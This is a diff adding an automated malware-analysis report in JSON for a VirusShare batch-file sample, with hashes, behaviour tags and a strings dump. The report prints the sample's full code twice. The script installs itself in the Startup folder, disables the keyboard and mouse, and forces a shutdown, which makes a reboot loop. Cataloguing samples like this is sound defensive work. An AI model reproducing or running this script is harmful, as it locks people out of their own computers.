@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "shell32": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\ncopy %0 c:\\windows\\startm~1\\programs\\startup\necho Wanna see something annoying?\nc:\\windows\\rundll32.exe mouse,disable\nc:\\windows\\rundll32.exe keyboard,disable\ncls\necho HAHA, You can't use your keyboard or mouse!\ncls\nSHUTDOWN -r -t -10\nTYPE NUL | CHOICE.COM /N/CY/TY,3 >NUL\ncopy %0 c:\\windows\\startm~1\\programs\\startup\nstart rundll.exe shell32.dll,SHExitWindowsEx 2"
+    },
+    "filename": "VirusShare_7b156e3a44f1804d436883326dd9763f",
+    "filesize": 385,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "7b156e3a44f1804d436883326dd9763f",
+        "sha1": "40de9ee965d77bd7829ac373b8bc6dddf11bc4ed",
+        "sha256": "709c058501d6aeba8dff2e73d2bca60f52e52c89c2cee0523399808a774dfb69"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "copy %0 c:\\windows\\startm~1\\programs\\startup",
+            "echo Wanna see something annoying?",
+            "c:\\windows\\rundll32.exe mouse,disable",
+            "c:\\windows\\rundll32.exe keyboard,disable",
+            "echo HAHA, You can't use your keyboard or mouse!",
+            "SHUTDOWN -r -t -10",
+            "TYPE NUL | CHOICE.COM /N/CY/TY,3 >NUL",
+            "copy %0 c:\\windows\\startm~1\\programs\\startup",
+            "start rundll.exe shell32.dll,SHExitWindowsEx 2"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.271032",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
